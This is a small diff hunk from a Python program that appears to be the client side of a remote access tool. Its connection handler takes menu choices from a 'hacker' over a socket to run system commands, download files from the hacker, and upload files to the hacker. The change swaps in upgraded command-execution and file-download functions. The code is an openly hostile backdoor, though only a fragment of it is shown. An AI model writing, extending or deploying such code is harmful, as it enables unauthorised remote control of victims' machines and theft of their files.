@@ -10,10 +10,11 @@ def handleConnection(my_socket):
         print("[+] hacker selected option = ", user_option)
         if user_option == "1":
             print("\t\t[+] Executing System Commands")
-            run_command(my_socket)
+            run_command_advanced(my_socket)
         elif user_option == "2":
             print("\t\t[+] Downloading Files from hacker")
-            my_socket.receive_file()
+            download_files(my_socket)
+
         elif user_option == "3":
             print("\t\t[+] Uploading Files to hacker")
         elif user_option == "4":
